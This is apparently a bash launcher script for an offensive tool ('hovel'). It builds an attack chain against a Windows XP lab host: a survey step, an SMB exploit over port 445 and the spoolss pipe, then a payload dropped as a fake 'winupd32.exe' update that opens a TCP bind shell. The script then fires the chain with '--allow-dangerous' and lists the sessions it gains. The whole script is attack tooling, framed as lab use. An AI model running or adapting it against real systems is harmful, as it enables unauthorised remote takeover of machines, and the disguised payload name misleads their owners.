#!/usr/bin/env bash
set -euo pipefail

root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
workspace="${HOVEL_WORKSPACE:-"$root/.hovel"}"
module_config="${HOVEL_MODULE_CONFIG:-"$root/examples/hovel-modules.json"}"
squatter_payload="${SQUATTER_PAYLOAD_PATH:-"$root/examples/bin/squatter.exe"}"
target_host="${HOVEL_LAB_TARGET_HOST:-192.168.122.142}"
target_id="${HOVEL_LAB_TARGET_ID:-xp-lab}"
bind_port="${HOVEL_SQUATTER_BIND_PORT:-9101}"
remote_path="${HOVEL_SQUATTER_REMOTE_PATH:-C:\\Windows\\Temp\\winupd32.exe}"
chain_file="$workspace/lab/etro-squatter-bind.chain.yaml"

mkdir -p "$(dirname "$chain_file")"
cat >"$chain_file" <<EOF
apiVersion: hovel.dev/v1alpha1
kind: Chain
metadata:
  name: etro-squatter-bind
spec:
  mode: configured
  steps:
    - id: survey
      uses: module:etro-survey@v0.1.0
    - id: exploit
      uses: module:etro-exploit@v1.0.0
    - id: squatter-bind
      uses: module:squatter@v0.1.0
      step: squatter.bind
  config:
    operator.confirmed_lab: "true"
    squatter.bind_port: "$bind_port"
    squatter.remote_path: '$remote_path'
  targets:
    - id: "$target_id"
      config:
        target.host: "$target_host"
        target.port: "445"
        pipe: "spoolss"
EOF

echo "Wrote $chain_file"
echo "Throwing Etro -> Squatter TCP bind at $target_host:$bind_port"
SQUATTER_PAYLOAD_PATH="$squatter_payload" HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$chain_file" --allow-dangerous --now
echo
echo "Active sessions:"
HOVEL_MODULE_CONFIG="$module_config" task run -- //cmd/hovel -- session list --workspace "$workspace"
